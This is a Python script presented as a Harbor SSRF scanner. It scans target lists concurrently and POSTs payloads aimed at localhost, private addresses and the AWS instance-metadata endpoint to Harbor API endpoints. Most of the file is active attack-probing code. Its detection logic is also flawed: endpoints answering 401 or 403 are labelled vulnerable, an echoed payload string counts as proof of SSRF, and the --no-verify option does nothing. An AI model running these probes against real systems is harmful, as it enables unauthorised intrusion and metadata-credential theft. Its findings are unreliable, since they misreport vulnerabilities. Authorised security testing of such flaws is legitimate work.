#!/usr/bin/env python3
"""
Harbor SSRF Scanner
====================
This tool scans for Server-Side Request Forgery (SSRF) vulnerabilities in VMware Harbor,
a popular open-source container image registry. It aims to identify misconfigurations
or vulnerabilities in Harbor's API endpoints that could allow SSRF attacks, including
accessing internal resources or performing unauthorized network calls.

Server-Side Request Forgery (SSRF) vulnerabilities can occur when user-supplied input is 
used to construct server-side HTTP requests without sufficient validation. Attacks often 
focus on infrastructure components, metadata endpoints, or other internal resources, 
and can lead to information exposure or remote exploitation.

Dependencies:
  - `httpx` (for asynchronous HTTP requests)
  - Python 3.10+ required

Usage:
  # Scan a single target
  python harbor_ssrf_scanner.py --target https://harbor.example.com

  # Scan a list of targets
  python harbor_ssrf_scanner.py --list targets.txt --output findings.json

  # Safe mode (detection only, no active probes)
  python harbor_ssrf_scanner.py --list targets.txt --safe

CLI Options:
  --target      Target URL to scan.
  --list        File containing a list of URLs to scan.
  --output      File to save JSON scan results.
  --safe        Detection-only mode, skips active SSRF probes.
  --concurrency Max concurrency for scanning targets (default: 20).
  --no-verify   Disable SSL certificate verification (e.g., for self-signed certs).

References:
  - https://github.com/goharbor/harbor
  - https://cwe.mitre.org/data/definitions/918.html
  - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
"""

import argparse
import asyncio
import httpx
import json
import sys
from urllib.parse import urljoin

# Constants
HARBOR_API_ENDPOINTS = [
    "/api/v2.0/projects",
    "/api/v2.0/systeminfo",
    "/api/v2.0/search",
    "/api/v2.0/registries/ping",
]
SSRF_TEST_URLS = [
    "http://localhost",
    "http://127.0.0.1",
    "http://169.254.169.254/latest/meta-data",  # AWS instance metadata
    "http://192.168.1.1",
]
REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 20

ANSI_COLORS = {
    "CRITICAL": "\033[91m",
    "HIGH": "\033[93m",
    "INFO": "\033[92m",
    "RESET": "\033[0m",
}

# Helper Functions
def normalize_url(url):
    """Ensure the URL contains a scheme and no trailing slash."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")

def ansi_colored(text, severity):
    """Return text wrapped in ANSI color codes based on severity."""
    return f"{ANSI_COLORS.get(severity, ANSI_COLORS['RESET'])}{text}{ANSI_COLORS['RESET']}"

async def test_api_endpoint(client, base_url, endpoint, semaphore):
    """Test if a specific Harbor API endpoint is accessible."""
    async with semaphore:
        try:
            response = await client.get(urljoin(base_url, endpoint), timeout=REQUEST_TIMEOUT, follow_redirects=True)
            if response.status_code in {200, 401, 403}:
                return True
        except Exception:
            pass
    return False

async def probe_ssrf(client, base_url, endpoint, semaphore, ssrf_url):
    """Send a crafted SSRF payload to the target API endpoint."""
    async with semaphore:
        try:
            target_url = urljoin(base_url, endpoint)
            response = await client.post(
                target_url,
                json={"url": ssrf_url},
                timeout=REQUEST_TIMEOUT,
                follow_redirects=True,
            )
            if response.status_code in {200, 302} and ssrf_url in response.text:
                return True
        except Exception:
            pass
    return False

async def scan_target(base_url, semaphore, safe_mode):
    """
    Perform SSRF detection and active probing on the target Harbor instance.

    Returns:
        - Dictionary with detection and probing results.
    """
    results = {"target": base_url, "vulnerable_endpoints": [], "ssrf_exploitable": []}
    async with httpx.AsyncClient(verify=False) as client:
        accessible_endpoints = []
        for endpoint in HARBOR_API_ENDPOINTS:
            if await test_api_endpoint(client, base_url, endpoint, semaphore):
                accessible_endpoints.append(endpoint)
                results["vulnerable_endpoints"].append(endpoint)
        
        if not safe_mode:
            for endpoint in accessible_endpoints:
                for ssrf_url in SSRF_TEST_URLS:
                    if await probe_ssrf(client, base_url, endpoint, semaphore, ssrf_url):
                        results["ssrf_exploitable"].append({"endpoint": endpoint, "payload": ssrf_url})
    return results

async def process_targets(args):
    """Process targets from CLI and perform scanning."""
    semaphore = asyncio.Semaphore(args.concurrency or SEMAPHORE_LIMIT)
    tasks = []

    if args.target:
        tasks.append(scan_target(normalize_url(args.target), semaphore, args.safe))
    elif args.list:
        with open(args.list, "r") as f:
            for line in f:
                tasks.append(scan_target(normalize_url(line.strip()), semaphore, args.safe))

    results = await asyncio.gather(*tasks)

    # Output results to console and optionally save to JSON
    for result in results:
        print(ansi_colored(f"Target: {result['target']}", "INFO"))
        if result["vulnerable_endpoints"]:
            print(ansi_colored("Detected vulnerable endpoints:", "HIGH"))
            for endpoint in result["vulnerable_endpoints"]:
                print(f"  - {endpoint}")
        if result["ssrf_exploitable"]:
            print(ansi_colored("SSRF exploitable endpoints:", "CRITICAL"))
            for exploit in result["ssrf_exploitable"]:
                print(f"  - Endpoint: {exploit['endpoint']}, Payload: {exploit['payload']}")
        print(ansi_colored("Scan complete.\n", "INFO"))
    
    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=4)

# Main Entry Point
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Harbor SSRF Scanner")
    parser.add_argument("--target", help="Target URL to scan")
    parser.add_argument("--list", help="File containing a list of URLs to scan")
    parser.add_argument("--output", help="File to save JSON scan results")
    parser.add_argument("--safe", action="store_true", help="Detection-only mode, skips active SSRF probes")
    parser.add_argument("--concurrency", type=int, default=20, help="Max concurrency for scanning targets")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification")
    args = parser.parse_args()

    # Display usage message if no target or list is provided
    if not args.target and not args.list:
        parser.print_help()
        sys.exit(1)

    asyncio.run(process_targets(args))
